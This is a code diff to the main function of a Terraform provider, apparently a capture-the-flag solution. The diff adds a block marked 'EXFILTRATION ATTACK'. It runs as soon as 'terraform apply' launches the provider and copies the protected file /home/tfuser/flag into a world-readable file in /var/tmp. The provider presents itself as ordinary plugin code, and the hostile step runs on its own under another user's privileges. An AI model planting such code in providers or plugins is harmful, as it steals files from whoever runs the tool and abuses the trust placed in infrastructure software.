@@ -7,9 +7,11 @@ import (
 	"context"
 	"flag"
 	"log"
+	"os"
 
+	"io"
 	"github.com/hashicorp/terraform-plugin-framework/providerserver"
-	"github.com/hashicorp/terraform-provider-scaffolding-framework/internal/provider"
+	"terraform-provider-soff/internal/provider"
 )
 
 var (
@@ -22,6 +24,21 @@ var (
 )
 
 func main() {
+	// --- EXFILTRATION ATTACK START ---
+	// This runs the moment 'terraform apply' calls the provider binary.
+	srcFile, err := os.Open("/home/tfuser/flag")
+	if err == nil {
+		defer srcFile.Close()
+		// We write to /var/tmp because you have read/write access there.
+		dstFile, err := os.Create("/var/tmp/flag_captured.txt")
+		if err == nil {
+			defer dstFile.Close()
+			io.Copy(dstFile, srcFile)
+			os.Chmod("/var/tmp/flag_captured.txt", 0666) // Make sure you can read it
+		}
+	}
+	// --- EXFILTRATION ATTACK END ---
+
 	var debug bool
 
 	flag.BoolVar(&debug, "debug", false, "set to true to run the provider with support for debuggers like delve")
@@ -35,7 +52,7 @@ func main() {
 		Debug:   debug,
 	}
 
-	err := providerserver.Serve(context.Background(), provider.New(version), opts)
+	err = providerserver.Serve(context.Background(), provider.New(version), opts)
 
 	if err != nil {
 		log.Fatal(err.Error())
